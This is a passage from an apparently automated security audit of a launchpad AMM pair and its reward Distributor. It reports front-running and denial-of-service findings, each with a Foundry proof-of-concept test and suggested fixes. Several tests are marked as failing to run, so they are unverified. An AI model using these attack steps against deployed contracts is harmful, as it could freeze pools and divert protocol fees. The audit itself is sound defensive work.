2. Call `_update`, which in turn calls `_distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1)`.
3. `_distributeLaunchpadFees` calls `IDistributor.addRewards(...)`.
4. Inside `Distributor.addRewards`, `rs.totalShares == 0` for the relevant pool, so it reverts with `NoSharesToIncentivize()`.
5. The revert bubbles back through `_distributeLaunchpadFees` and `_update` to revert the entire `swap`.

This creates a realistic **availability DoS** condition:
* It is entirely possible for all stakers to exit a pool while `rewardsPoolActive` is still left on by the Launchpad.
* In that state, AMM swaps (and mints/burns that generate fees) become unusable because each swap tries to send fees to a reward pool that rejects them.
* Any user attempting to swap will see their transaction revert, even though the pair itself has ample liquidity and the revert is purely due to an internal bookkeeping constraint in an external contract.

The DoS does not require special privileges: it is triggered by normal swaps under an unfortunate but realistic state combination (zero shares + rewardsPoolActive = 1).

## Impact
If the Distributor’s reward pool exists but has zero shares while the pair’s rewardsPoolActive remains set, any entrypoint that attempts to forward fees to the Distributor will revert. This includes swaps and also mint/burn/sync when distribution is triggered, effectively freezing the pool for regular users until admin/governance deactivates rewards or the Distributor accepts zero-share deposits.

## Command to Run Test


## Proof of Concept
How to reliably hit the revert without privileged actions beyond normal Launchpad setup:
1) Launch a pair with a valid Distributor set; Distributor creates the rewards pool for (token0, token1) but no stakers yet, so totalShares == 0.
2) Add initial liquidity to the pair (so reserves become non-zero). Transfer the freshly minted LP tokens to launchpadLp to ensure _getLaunchpadFees returns nonzero fees.
3) In the same block, perform a small swap to accrue launchpad fees (timeElapsed == 0), causing _update to store accruedLaunchpadFee0/1.
4) Advance the block timestamp > 0. Now perform another small swap (or call sync). Because timeElapsed > 0 and reserves are non-zero, _update calls _distributeLaunchpadFees with the accrued totals.
5) _distributeLaunchpadFees calls Distributor.addRewards, which reverts with NoSharesToIncentivize() as totalShares == 0. The revert bubbles, causing the swap (or sync/mint/burn) to revert and the pool to be DoS’ed until admin disables rewards or shares become non-zero.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function transfer(address to, uint256 v) external returns (bool) { balanceOf[msg.sender] -= v; balanceOf[to] += v; return true; }
    function transferFrom(address from, address to, uint256 v) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - v;
        balanceOf[from] -= v; balanceOf[to] += v; return true;
    }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; return true; }
    function mint(address to, uint256 v) external { balanceOf[to] += v; }
}

contract GTELaunchpadV2PairRewardsDosTest is Test {
    GTELaunchpadV2Pair pair;
    Distributor dist;
    ERC20Mock token0; ERC20Mock token1;

    address constant LAUNCHPAD_LP = address(0xDEAD);

    function setUp() public {
        // Deploy Distributor and set launchpad authority to this test
        dist = new Distributor();
        dist.initialize(address(this));

        // Deploy tokens
        token0 = new ERC20Mock("T0", "T0");
        token1 = new ERC20Mock("T1", "T1");

        // Deploy pair (factory is msg.sender == this test contract)
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), LAUNCHPAD_LP, address(dist));

        // Create rewards pool for the token pair (no stakers yet => totalShares == 0)
        dist.createRewardsPair(address(token0), address(token1));

        // Provide initial liquidity so reserves > 0
        token0.mint(address(pair), 1_000_000 ether);
        token1.mint(address(pair), 1_000_000 ether);
        pair.mint(address(this)); // sets reserves and LP totalSupply

        // Give (almost) all LP to launchpadLp so _getLaunchpadFees > 0
        uint256 lpBal = pair.balanceOf(address(this));
        pair.transfer(LAUNCHPAD_LP, lpBal);
    }

    function test_SwapsDoSWhenNoSharesButRewardsActive() public {
        // 1) Same-block swap to accrue fees (timeElapsed == 0) -> accrues, does NOT distribute
        token0.mint(address(this), 10_000 ether);
        token0.transfer(address(pair), 10_000 ether);
        pair.swap(0, 1, address(this), ""); // tiny out to satisfy nonzero output, should pass

        // 2) Next block: distribution is attempted and reverts due to NoSharesToIncentivize
        vm.warp(block.timestamp + 1);

        // Provide a bit more input for the second swap
        token0.mint(address(this), 1 ether);
        token0.transfer(address(pair), 1 ether);

        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 1, address(this), ""); // bubbles revert from Distributor.addRewards
    }
}


## Suggested Mitigation
Make launchpad-fee forwarding non-fatal and preserve accounting on failure. Recommended options (can be combined):
- In GTELaunchpadV2Pair._update: only invoke _distributeLaunchpadFees when rewardsPoolActive > 0 AND the Distributor reports a valid pool with totalShares > 0. You can query via IDistributor.getRewardsPoolData(token0) first; if quoteAsset != token1, query token1. If no pool or totalShares == 0, do not call addRewards; keep fees in accruedLaunchpadFee{0,1} for later retry.
- In GTELaunchpadV2Pair._distributeLaunchpadFees: wrap the external call in try/catch and on catch restore accrual so funds are not lost and swaps don’t revert, e.g.:
  - Move deletion of accruedLaunchpadFee0/1 until after a successful addRewards, OR
  - If you must delete before the call, then in catch set accruedLaunchpadFee0/1 back to the attempted total values to preserve them.
- In Distributor.addRewards: remove the revert on zero shares and instead accumulate amounts into pending rewards (the RewardsTracker logic safely carries pending amounts forward until shares > 0). This alone eliminates the DoS and is backward-compatible with current math since pending rewards are only applied when totalShares > 0.
- Operationally enforce ordering: when the last shares are about to be removed, the Launchpad should call Distributor.endRewards(pair) first (which triggers pair.endRewardsAccrual). Consider enforcing this in decreaseStake by checking if removal would drop totalShares to zero while the pair is still active, and either auto-end rewards or revert with a clear message.





 **Derived From** : BeaconOrFactoryAuthorityDrift

## [M-31]. Permissionless GTELaunchpadV2PairFactory.createPair lets anyone permanently block launchpad‑enabled pair for a token pair

### Finding Severity Justification: Any EOA can front-run GTELaunchpadV2PairFactory.createPair for a launch token/quote pair and permanently occupy the getPair[token0][token1] slot with a pair initialized with zero launchpad parameters. This prevents the Launchpad from later creating the intended launchpad-wired pair, breaking graduation flow assumptions and permanently disabling launchpad fee routing for that market. This is a protocol-functionality and revenue-impacting DoS, but does not directly steal user funds, fitting Medium severity.
## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
GTELaunchpadV2PairFactory.createPair

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2PairFactory.createPair is permissionless, but only when called by the trusted launchpad address are the launchpad‑specific parameters (launchpadLp, launchpadFeeDistributor) wired into the newly‑created pair. The factory enforces a single canonical pair per token pair using getPair[token0][token1], which **does not include** these launchpad parameters in its key.

Relevant code:

```solidity
mapping(address => mapping(address => address)) public getPair;

function createPair(address tokenA, address tokenB) external returns (address pair) {
    if (tokenA == tokenB) revert("UniswapV2: IDENTICAL_ADDRESSES");
    (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    if (token0 == address(0)) revert("UniswapV2: ZERO_ADDRESS");
    if (getPair[token0][token1] != address(0)) revert("UniswapV2: PAIR_EXISTS");
    bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;

    (address _launchpadLp, address _launchpadFeeDistributor) =
        msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));

    bytes32 salt = keccak256(abi.encodePacked(token0, token1, _launchpadLp, _launchpadFeeDistributor));
    assembly {
        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)
    }
    IUniswapV2Pair(pair).initialize(token0, token1, _launchpadLp, _launchpadFeeDistributor);
    getPair[token0][token1] = pair;
    getPair[token1][token0] = pair;
    allPairs.push(pair);
    emit PairCreated(token0, token1, pair, allPairs.length);
}
```

Behavior:
- Any address can call createPair(tokenA, tokenB).
- If msg.sender != launchpad, then _launchpadLp and _launchpadFeeDistributor are both set to address(0), so the pair is initialized **without** launchpad fee wiring.
- getPair[token0][token1] is updated for this pair, and subsequent createPair calls for the same token pair revert with "UniswapV2: PAIR_EXISTS".

Attack scenario:
1. A new launchpad token L and quote token Q are known before Launchpad has called createPair(L, Q).
2. An attacker front‑runs and calls factory.createPair(L, Q) from a normal EOA.
   - This succeeds, creating a GTELaunchpadV2Pair with launchpadLp = 0 and launchpadFeeDistributor = 0.
   - getPair[L][Q] is now permanently set to this non‑launchpad pair.
3. When the legitimate Launchpad contract later attempts to call createPair(L, Q) as part of the graduation flow, the call hits the guard:

```solidity
if (getPair[token0][token1] != address(0)) revert("UniswapV2: PAIR_EXISTS");
```

and reverts. The Launchpad can no longer create its own fee‑enabled pair for (L, Q) through this factory.

Impact:
- The canonical pool for (L, Q) in this factory is a generic pair that **never accrues launchpad swap fees** (launchpadFeeDistributor = 0), breaking token‑launch economics and the documented invariant that launchpad tokens graduate into special GTELaunchpadV2Pair pools whose swap fees feed the Distributor.
- Depending on how graduation logic and frontends are implemented, this can:
  - prevent a launch from completing, blocking users from exiting bonding‑curve positions via the expected AMM, or
  - silently route volume through the attacker‑created generic pool, permanently depriving the protocol and LPs of the configured launchpad fee share.

This is a textbook factory authority drift / front‑run DoS: the authority over the (token0, token1) → pair binding can be preempted by any EOA before the intended privileged Launchpad contract acts, and that binding then blocks future creation of the correct, launchpad‑wired pair.

## Impact
Any EOA can permanently block the Launchpad from creating its intended rewards‑enabled GTELaunchpadV2Pair for a given token pair, breaking the graduation flow and disabling launchpad fee routing for that market.

## Command to Run Test


## Proof of Concept
1. Deploy GTELaunchpadV2PairFactory with some addresses for feeToSetter, launchpad, launchpadLp, and launchpadFeeDistributor.
2. Let tokenA and tokenB be two ERC‑20 tokens that will be used in a future launch.
3. Attacker calls factory.createPair(tokenA, tokenB) from an EOA that is **not** the launchpad address.
   - This succeeds and sets getPair[token0][token1] to the new pair with launchpadLp = 0 and launchpadFeeDistributor = 0.
4. Later, the real Launchpad contract calls factory.createPair(tokenA, tokenB) (msg.sender == launchpad).
5. The call reverts with "UniswapV2: PAIR_EXISTS" because getPair[token0][token1] is already non‑zero.
6. Launchpad graduation logic that relies on being able to create the official launchpad pair for (tokenA, tokenB) can no longer do so, effectively DoSing the expected launchpad‑enabled pool for that token pair.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract FactoryFrontRunTest is Test {
    GTELaunchpadV2PairFactory factory;

    address feeToSetter = address(0xFEE1);
    address launchpad = address(0xA11CE);
    address launchpadLp = address(0xBEEF);
    address launchpadFeeDistributor = address(0xD15C);

    address tokenA = address(0xAAA1);
    address tokenB = address(0xBBB2);

    function setUp() public {
        factory = new GTELaunchpadV2PairFactory(feeToSetter, launchpad, launchpadLp, launchpadFeeDistributor);
    }

    function test_attackerCanBlockLaunchpadPairCreation() public {
        address attacker = address(0xBADC0DE);

        // Attacker front-runs and creates the pair first (msg.sender != launchpad)
        vm.prank(attacker);
        address pair1 = factory.createPair(tokenA, tokenB);
        assertTrue(pair1 != address(0));

        // Mapping is now occupied for this token pair
        assertEq(factory.getPair(tokenA, tokenB), pair1);
        assertEq(factory.getPair(tokenB, tokenA), pair1);

        // Verify the created pair has no launchpad wiring (fees will never accrue to Distributor)
        GTELaunchpadV2Pair p = GTELaunchpadV2Pair(pair1);
        assertEq(p.launchpadLp(), address(0));
        assertEq(p.launchpadFeeDistributor(), address(0));

        // Launchpad can no longer create the intended launchpad-wired pair
        vm.prank(launchpad);
        vm.expectRevert(bytes("UniswapV2: PAIR_EXISTS"));
        factory.createPair(tokenA, tokenB);
    }
}


## Suggested Mitigation
If this factory is intended to deploy only launchpad-wired pools, enforce a single authority:

- Simplest hardening (recommended):
  function createPair(address tokenA, address tokenB) external returns (address pair) {
      require(msg.sender == launchpad, "FORBIDDEN");
      // existing logic, but always set _launchpadLp = launchpadLp and _launchpadFeeDistributor = launchpadFeeDistributor
  }

- If permissionless generic pools are still desired, gate only launchpad-managed tokens:
  - Maintain a registry mapping(address => bool) isLaunchpadToken set by Launchpad when a token is scheduled for graduation.
  - In createPair, if isLaunchpadToken[tokenA] || isLaunchpadToken[tokenB], require(msg.sender == launchpad). Otherwise allow permissionless creation.
  - Keep a single canonical getPair mapping per (token0, token1) and always prevent non-launchpad callers from occupying the slot for launchpad-managed tokens.

Either approach prevents authority drift where an EOA can pre-occupy the (token0, token1) slot and permanently block the launchpad-wired pair.





 **Derived From** : GriefableCallbacks

## [L-32]. External Distributor callback inside _update can DoS swaps/mint/burn if it reverts

### Finding Severity Justification: The issue can DoS core AMM operations (swap/mint/burn/sync) if the externally called Distributor.addRewards reverts. Impact is availability/liveness, not direct loss of assets. Given the Distributor is a protocol-owned, trusted module set by the Launchpad/Factory (not attacker-controlled), this is primarily a centralization/liveness risk rather than a permissionless exploit.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair’s core state update function `_update` conditionally calls an external Distributor contract via `_distributeLaunchpadFees`. This call is unguarded: there is no try/catch, no gas limit, and no fallback path. Any revert or gas exhaustion in `IDistributor.addRewards` will cause `_update` to revert and thus revert all calling operations (swap, mint, burn, sync, endRewardsAccrual).

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

    uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
    }
}
```

Because `_update` is invoked from `swap`, `mint`, `burn`, `sync`, and `endRewardsAccrual`, any systematic failure in `addRewards` (e.g., due to a logic bug, misconfigured Distributor address, or edge-case state condition) can:
- make all swaps revert whenever `timeElapsed > 0` and there are pending launchpad fees,
- prevent LPs from minting or burning liquidity,
- prevent `sync` and `endRewardsAccrual` from succeeding.

This is a classic griefable-callback pattern: the AMM’s core flow is tightly coupled to an external module whose correctness is not guaranteed by the AMM contract itself.

## Impact
If the configured launchpadFeeDistributor address points to a contract whose addRewards reverts (for any reason), the AMM pair can be effectively bricked: swaps, mints, burns, and syncs will revert whenever fee distribution is triggered, denying service to all users and possibly trapping liquidity.

## Command to Run Test


## Proof of Concept
1. Configure a Distributor implementation (or misconfigure launchpadFeeDistributor) such that `addRewards` always reverts (e.g., it has `revert("ERR");` at the top).
2. Provide initial liquidity to the pair so that swaps produce non‑zero launchpad fees and `launchpadFeeDistributor` is non‑zero.
3. Wait until at least one block elapses so `timeElapsed > 0` in `_update`.
4. Execute a swap that causes `_getLaunchpadFees` to return positive values.
5. Inside `_update`, the pair attempts `_distributeLaunchpadFees`, which calls the reverting `addRewards`, causing the entire swap to revert. Repeating this, all swaps that hit the fee distribution condition will revert, as will mint/burn flows that go through `_update` in the same circumstances.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {GTELaunchpadV2PairFactory} from "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";

contract RevertingDistributor {
    function addRewards(address, address, uint128, uint128) external pure { revert("FAIL"); }
}

contract ERC20Mintable {
    string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}

contract DistributorDoSTest is Test {
    GTELaunchpadV2PairFactory factory;
    GTELaunchpadV2Pair pair;
    ERC20Mintable token0;
    ERC20Mintable token1;
    RevertingDistributor dist;

    address lp = address(0xBEEF);

    function setUp() public {
        token0 = new ERC20Mintable("T0", "T0");
        token1 = new ERC20Mintable("T1", "T1");
        dist = new RevertingDistributor();

        // Deploy real Factory so pair.factory() implements feeTo() (avoids _mintFee revert)
        factory = new GTELaunchpadV2PairFactory(address(this), address(this), lp, address(dist));

        // Create the pair as the launchpad (msg.sender == launchpad)
        address p = factory.createPair(address(token0), address(token1));
        pair = GTELaunchpadV2Pair(p);

        // Seed large liquidity to make fee math non-zero and swap feasible
        token0.mint(address(this), 1_100_000 ether);
        token1.mint(address(this), 1_100_000 ether);

        token0.transfer(address(pair), 1_000_000 ether);
        token1.transfer(address(pair), 1_000_000 ether);
        // Mint LP to the configured launchpadLp so fee share is ~100%
        pair.mint(lp);

        // Advance time so _update takes the timeElapsed > 0 branch
        vm.warp(block.timestamp + 1);
    }

    function test_distributorRevertBricksSwap() public {
        // Pre-send input to pair so swap sees amountIn and accrues launchpad fees
        token1.transfer(address(pair), 1_000 ether); // amount1In = 1000e18 -> fee1 ≈ 1e18

        vm.expectRevert(bytes("FAIL"));
        // Take some token0 out; invariant holds due to the pre-sent token1
        pair.swap(100 ether, 0, address(this), new bytes(0));
    }
}


## Suggested Mitigation
Fully decouple the external Distributor from core AMM liveness:
- Wrap the external call and preserve accrued fees on failure. Do not clear accrued fees before a successful distribution. Example:
  // inside _update, before distribution
  if (launchpadFeeDistributor > address(0) && (totalLaunchpadFee0 | totalLaunchpadFee1) > 0) {
      // attempt distribution without losing state on failure
      try IDistributor(launchpadFeeDistributor).addRewards(token0, token1, uint128(totalLaunchpadFee0), uint128(totalLaunchpadFee1)) {
          // distribution succeeded; now clear accrued
          delete accruedLaunchpadFee0;
          delete accruedLaunchpadFee1;
          emit LaunchpadFeesCollected(totalLaunchpadFee0, totalLaunchpadFee1);
      } catch {
          // keep totals as accrued so reserves stay net-of-fees and future attempts can retry
          accruedLaunchpadFee0 = totalLaunchpadFee0;
          accruedLaunchpadFee1 = totalLaunchpadFee1;
      }
  }
  // reserves update can continue to subtract totalLaunchpadFee{0,1} as today
- Add an emergency breaker to disable distribution without bricking swaps. For example:
  function setLaunchpadFeeDistributor(address newDistributor) external { require(msg.sender == IUniswapV2Factory(factory).feeToSetter(), "FORBIDDEN"); launchpadFeeDistributor = newDistributor; }
  or a simpler toggle:
  function disableRewards() external { require(msg.sender == IUniswapV2Factory(factory).feeToSetter(), "FORBIDDEN"); rewardsPoolActive = 0; launchpadFeeDistributor = address(0); }
- Optionally, pre-validate and monitor the Distributor address off-chain; deploy via vetted code and avoid upgrade patterns that could introduce reverts in addRewards.





 **Derived From** : Launchpad pair fee distribution can revert swaps when no stakers remain

## [M-33]. GTELaunchpadV2Pair swap path hard-reverts via Distributor.addRewards when rewards active but totalShares == 0

### Finding Severity Justification: Swaps (and liquidity ops) on GTELaunchpadV2Pair can be permissionlessly DoSed when Distributor.addRewards reverts due to rs.totalShares == 0. Impact is protocol availability for the affected AMM pair (not direct asset loss), which maps to Medium per Code4rena rubric.
## Derived From Pattern/Invariant
Launchpad pair fee distribution can revert swaps when no stakers remain

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Uniswap V2–style launchpad pair `GTELaunchpadV2Pair` sends a portion of swap fees to the `Distributor` for stakers. This is done unconditionally inside the core `_update` function, which is called by all liquidity operations (mint, burn, swap, sync). If the associated reward pool has `totalShares == 0`, `Distributor.addRewards` will revert with `NoSharesToIncentivize`, causing **all swaps (and mints/burns that accrue fees) to revert**, effectively DoS‑ing the AMM pair.

Key parts of the pair:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

Distributor's `addRewards` implementation:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);

        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

When `launchpadFeeDistributor` is set (by Launchpad) and `rewardsPoolActive > 0`, every swap that accrues a nonzero `launchpadFee0` or `launchpadFee1` will, once `timeElapsed > 0`, call `_distributeLaunchpadFees` → `Distributor.addRewards`. There is **no error handling**, so any revert in `addRewards` bricks the entire swap/mint/burn operation.

Due to the LaunchToken bug described in the previous finding, it is realistic that:

- The reward pool for this launch asset exists (`rs.quoteAsset != address(0)`) and was used during bonding.
- All bonding shares have been removed via `decreaseStake` calls (triggered by `LaunchToken._decreaseFeeShares`), so `rs.totalShares == 0`.
- Launchpad never called `endRewards()`, so the pair remains configured with `launchpadFeeDistributor != address(0)` and `rewardsPoolActive > 0`.

In this state, the very next swap that tries to distribute any accumulated launchpad fee will hit:

```solidity
if (rs.totalShares == 0) revert NoSharesToIncentivize();
```

and revert **all the way up the stack**, DoS‑ing swaps and any liquidity operation that generates fees. Because `_update` is in the critical path of all core AMM methods, this is a classic **griefable external callback** and **unhandled revert** inside a fundamental liquidity function.

## Impact
Once the reward pool reaches `totalShares == 0` while `launchpadFeeDistributor` and `rewardsPoolActive` are still set, any swap/mint/burn that attempts to distribute launchpad fees will revert via `Distributor.addRewards`. As a result, the launchpad AMM pair for that token becomes unusable (all swaps and some LP actions revert) until the contracts are upgraded or reconfigured off‑chain.

## Command to Run Test


## Proof of Concept
The following test demonstrates that when a GTELaunchpadV2Pair is configured with a Distributor reward pool that has `totalShares == 0`, a swap that accrues launchpad fees will revert with `NoSharesToIncentivize`.

We bypass Launchpad/LaunchToken and wire the components directly to show the callback failure. In the real system, the same state arises naturally when bonding shares are fully unstaked post‑unlock (see previous finding).

Steps:
1. Deploy two simple ERC20 tokens and mint initial balances.
2. Deploy a real `Distributor` and initialize it with a dummy launchpad address.
3. From the dummy launchpad, call `createRewardsPair(base, quote)` on Distributor to initialize the reward pool (so `RewardsDoNotExist` is avoided) but do **not** stake any shares; `rs.totalShares == 0`.
4. Deploy a `GTELaunchpadV2Pair` and call `initialize(token0, token1, launchpadLp, address(distributor))`.
5. Provide initial liquidity via `mint` so the pair has reserves and price history.
6. Warp the block timestamp forward by 1 second so `_update` sees `timeElapsed > 0`.
7. Execute a swap that sends some `token0` into the pair and takes some `token1` out, generating a non‑zero `launchpadFee0`.
8. `_update` will compute non‑zero `totalLaunchpadFee0`, call `_distributeLaunchpadFees`, which calls `Distributor.addRewards`.
9. Since `rs.totalShares == 0`, `addRewards` reverts `NoSharesToIncentivize`, causing the swap to revert.

This shows a permissionless user attempting a normal swap can be blocked entirely by the mismatch `rewardsPoolActive == 1` and `totalShares == 0`.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract TestERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _n, string memory _s) {
        name = _n; symbol = _s;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract LaunchpadPairDoSTest is Test {
    TestERC20 token0;
    TestERC20 token1;
    Distributor distributor;
    GTELaunchpadV2Pair pair;

    address launchpad = address(0x1234);
    address launchpadLp = address(0x9999);
    address trader = address(0xBEEF);

    function setUp() public {
        token0 = new TestERC20("T0", "T0");
        token1 = new TestERC20("T1", "T1");

        distributor = new Distributor();
        // owner is msg.sender here
        distributor.initialize(launchpad);

        // Initialize rewards pair (base = token0, quote = token1), but do NOT stake any shares
        vm.prank(launchpad);
        distributor.createRewardsPair(address(token0), address(token1));

        // Deploy pair and initialize
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));

        // Provide initial liquidity: mint tokens to pair then call mint()
        token0.mint(address(pair), 1_000 ether);
        token1.mint(address(pair), 1_000 ether);

        vm.prank(address(this));
        pair.mint(launchpadLp);

        // Ensure reserves are non-zero and timestamp recorded
        (uint112 r0, uint112 r1,) = pair.getReserves();
        assertGt(r0, 0, "reserve0 should be > 0");
        assertGt(r1, 0, "reserve1 should be > 0");

        // Move time forward so next _update call will attempt to distribute fees immediately
        vm.warp(block.timestamp + 1);
    }

    function test_SwapRevertsWhenTotalSharesZeroButRewardsActive() public {
        // Trader sends token0 in and expects token1 out
        token0.mint(trader, 10 ether);

        vm.startPrank(trader);
        token0.transfer(address(pair), 10 ether);

        // Choose a small amount1Out less than reserve1
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amount1Out = r1 / 10;

        // Expect swap to revert due to Distributor.addRewards -> NoSharesToIncentivize
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, amount1Out, trader, "");
        vm.stopPrank();
    }
}


## Suggested Mitigation
Make fee distribution non-reverting and state-consistent. Two complementary changes are recommended:

A) Pair-side guard + reorder to avoid stranded funds and DoS
- Add a lightweight view in Distributor and its interface to read pool state by base asset: getRewardsPoolData(address launchAsset) returns (RewardPoolDataMemory), which includes totalShares and quoteAsset.
- In GTELaunchpadV2Pair._update, before clearing accruedLaunchpadFee* and before adjusting reserves, query Distributor to identify the launch asset (whichever of token0/token1 has a non-zero quoteAsset in getRewardsPoolData). If totalShares == 0:
  - Set rewardsPoolActive = 0 in the pair to stop any further accruals.
  - Do NOT delete accruedLaunchpadFee* and do NOT subtract totalLaunchpadFee* from reserves in this call (leave accrued to zero or explicitly keep accruing as 0 going forward). This prevents leaving unaccounted tokens in the pair.
- If totalShares > 0, attempt distribution first (in a try block). Only upon success:
